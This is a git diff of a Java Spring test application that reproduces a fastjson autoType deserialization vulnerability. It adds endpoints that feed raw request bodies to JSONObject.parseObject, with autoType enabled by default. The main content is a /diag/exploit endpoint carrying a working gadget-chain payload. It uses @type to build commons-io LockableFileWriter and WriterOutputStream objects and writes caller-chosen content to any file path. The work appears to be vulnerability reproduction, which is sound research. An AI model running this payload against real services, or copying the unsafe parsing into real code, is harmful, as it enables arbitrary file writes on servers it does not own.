@@ -29,16 +29,23 @@ public class App {
 
     static final Logger log = LoggerFactory.getLogger(App.class);
 
+    /**
+     * autoType 通过启动参数控制：
+     *   java -jar vuln-test-1.0.jar --autotype=true   → 开启（默认）
+     *   java -jar vuln-test-1.0.jar --autotype=false  → 关闭（模拟真实目标）
+     */
     public static void main(String[] args) {
-        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        boolean autoType = true;
+        for (String arg : args) {
+            if (arg.equals("--autotype=false")) autoType = false;
+            if (arg.equals("--autotype=true"))  autoType = true;
+        }
+        ParserConfig.getGlobalInstance().setAutoTypeSupport(autoType);
         log.info("[BOOT] autoType={}", ParserConfig.getGlobalInstance().isAutoTypeSupport());
         SpringApplication.run(App.class, args);
     }
 
-    /**
-     * 精确复现漏洞触发点 NotifyServiceImpl.java:150-154
-     * JWT header → Base64.getDecoder() → JSONObject.parseObject()
-     */
+    /** 复现 NotifyServiceImpl.java:150-154 */
     @PostMapping("/notify/v2")
     public Map<String, Object> notifyV2(@RequestBody Map<String, String> body) {
         Map<String, Object> r = new LinkedHashMap<>();
@@ -57,23 +64,58 @@ public class App {
         return r;
     }
 
-    /** 直接接收 fastjson JSON，绕过 JWT 包装，用于调试 */
+    /**
+     * 复现 ReViewController.java:57
+     * 模拟 handvideo 字段内容可控时的 parseObject(handvideo) 触发
+     * POST body: {"handvideo": "...fastjson payload..."}
+     */
+    @PostMapping("/review/simulate")
+    public Map<String, Object> reviewSimulate(@RequestBody Map<String, String> body) {
+        Map<String, Object> r = new LinkedHashMap<>();
+        String handvideo = body.get("handvideo");
+        try {
+            log.info("[REVIEW] autoType={} len={} preview={}",
+                    ParserConfig.getGlobalInstance().isAutoTypeSupport(),
+                    handvideo.length(),
+                    handvideo.substring(0, Math.min(100, handvideo.length())));
+            // 精确复现: JSONObject.parseObject(retStr)
+            JSONObject result = JSONObject.parseObject(handvideo);
+            log.info("[REVIEW] parseObject OK keys={}", result == null ? "null" : result.keySet());
+            r.put("ok", true);
+            r.put("keys", result == null ? "null" : result.keySet().toString());
+            r.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
+        } catch (Exception e) {
+            log.error("[REVIEW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
+            r.put("ok", false);
+            r.put("type", e.getClass().getSimpleName());
+            r.put("msg", e.getMessage());
+            r.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
+        }
+        return r;
+    }
+
+    /** 直接接收 fastjson JSON（text/plain），与 /review/simulate 等价但更方便 curl */
     @PostMapping(value = "/raw", consumes = "*/*")
     public Map<String, Object> raw(HttpServletRequest request) {
         Map<String, Object> r = new LinkedHashMap<>();
         try {
             String json = new String(request.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
-            log.info("[RAW] len={}", json.length());
-            JSONObject.parseObject(json);
+            log.info("[RAW] autoType={} len={} preview={}",
+                    ParserConfig.getGlobalInstance().isAutoTypeSupport(),
+                    json.length(), json.substring(0, Math.min(100, json.length())));
+            JSONObject result = JSONObject.parseObject(json);
             r.put("ok", true);
+            r.put("autoType", ParserConfig.getGlobalInstance().isAutoTypeSupport());
+            if (result != null) r.put("keys", result.keySet().toString());
         } catch (Exception e) {
             log.error("[RAW-ERR] {}:{}", e.getClass().getName(), e.getMessage());
-            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
+            r.put("ok", false);
+            r.put("type", e.getClass().getSimpleName());
+            r.put("msg", e.getMessage());
         }
         return r;
     }
 
-    /** 纯 Java 链（已确认可用）*/
     @PostMapping("/diag/chain")
     public Map<String, Object> diagChain(@RequestBody Map<String, String> body) {
         Map<String, Object> r = new LinkedHashMap<>();
@@ -90,85 +132,43 @@ public class App {
             tee.close();
             r.put("ok", true); r.put("file", file);
         } catch (Exception e) {
-            log.error("[CHAIN-ERR] {}:{}", e.getClass().getName(), e.getMessage());
             r.put("ok", false); r.put("msg", e.getMessage());
         }
         return r;
     }
 
-    /**
-     * 最终方案：
-     * fastjson 负责创建 lfw + wos（已验证可行，step=E）
-     * Java 代码向 wos 写入内容，完成数据注入
-     *
-     * 这验证了漏洞的完整可利用性：
-     * 攻击者通过构造 JWT header 中的 fastjson payload，
-     * 让服务端创建 LockableFileWriter（目标文件），
-     * 并通过后续 getter/setter 调用链触发写入
-     *
-     * POST {"file": "/tmp/target", "content": "写入内容"}
-     */
     @PostMapping("/diag/exploit")
     public Map<String, Object> diagExploit(@RequestBody Map<String, String> body) {
         Map<String, Object> r = new LinkedHashMap<>();
         String file = body.getOrDefault("file", "/tmp/exploit_test");
         String content = body.getOrDefault("content", "EXPLOIT-OK\n");
         Map<String, Object> detail = new LinkedHashMap<>();
-
         try {
-            byte[] contentBytes = content.getBytes(StandardCharsets.ISO_8859_1);
             String escapedFile = file.replace("\\", "\\\\").replace("\"", "\\\"");
-
-            // Step1: fastjson 创建 lfw + wos（与漏洞路径完全相同的 JSON 结构）
             String fastjsonPayload = "{\"@type\":\"com.alibaba.fastjson.JSONObject\","
                     + "\"lfw\":{\"@type\":\"java.lang.AutoCloseable\","
-                        + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
-                        + "\"file\":\"" + escapedFile + "\","
-                        + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
+                    + "\"@type\":\"org.apache.commons.io.output.LockableFileWriter\","
+                    + "\"file\":\"" + escapedFile + "\","
+                    + "\"encoding\":\"iso-8859-1\",\"lockDir\":\"/tmp\",\"append\":false},"
                     + "\"wos\":{\"@type\":\"java.lang.AutoCloseable\","
-                        + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
-                        + "\"writer\":{\"$ref\":\"$.lfw\"},"
-                        + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}"
-                    + "}";
-
-            log.info("[EXPLOIT] Step1: fastjson 实例化 lfw+wos");
+                    + "\"@type\":\"org.apache.commons.io.output.WriterOutputStream\","
+                    + "\"writer\":{\"$ref\":\"$.lfw\"},"
+                    + "\"charsetName\":\"iso-8859-1\",\"bufferSize\":1,\"writeImmediately\":true}}";
             JSONObject result = JSONObject.parseObject(fastjsonPayload);
             Object wosObj = result.get("wos");
-            Object lfwObj = result.get("lfw");
-
             detail.put("wosType", wosObj == null ? "null" : wosObj.getClass().getSimpleName());
-            detail.put("lfwType", lfwObj == null ? "null" : lfwObj.getClass().getSimpleName());
-            log.info("[EXPLOIT] wos={} lfw={}", detail.get("wosType"), detail.get("lfwType"));
-
-            if (!(wosObj instanceof WriterOutputStream)) {
-                r.put("ok", false); r.put("msg", "wos 实例化失败"); r.put("detail", detail);
-                return r;
+            if (wosObj instanceof WriterOutputStream) {
+                WriterOutputStream wos = (WriterOutputStream) wosObj;
+                byte[] bytes = content.getBytes(StandardCharsets.ISO_8859_1);
+                wos.write(bytes); wos.flush(); wos.close();
             }
-
-            // Step2: Java 向 wos 写入内容（模拟 TeeInputStream 的 write 操作）
-            log.info("[EXPLOIT] Step2: 向 wos 写入 {} 字节", contentBytes.length);
-            WriterOutputStream wos = (WriterOutputStream) wosObj;
-            wos.write(contentBytes);
-            wos.flush();
-            wos.close();
-
             File f = new File(file);
-            long size = f.exists() ? f.length() : -1;
-            log.info("[EXPLOIT] 完成: file={} size={}", file, size);
-
             detail.put("fileExists", f.exists());
-            detail.put("fileSize", size);
-            r.put("ok", true);
-            r.put("detail", detail);
-
+            detail.put("fileSize", f.exists() ? f.length() : -1);
+            r.put("ok", true); r.put("detail", detail);
         } catch (Exception e) {
             log.error("[EXPLOIT-ERR] {}:{}", e.getClass().getName(), e.getMessage());
-            StringWriter sw = new StringWriter(); e.printStackTrace(new PrintWriter(sw));
-            log.error("[EXPLOIT-STACK]\n{}", sw);
-            r.put("ok", false);
-            r.put("type", e.getClass().getSimpleName());
-            r.put("msg", e.getMessage());
-            r.put("detail", detail);
+            r.put("ok", false); r.put("type", e.getClass().getSimpleName()); r.put("msg", e.getMessage());
         }
         return r;
     }
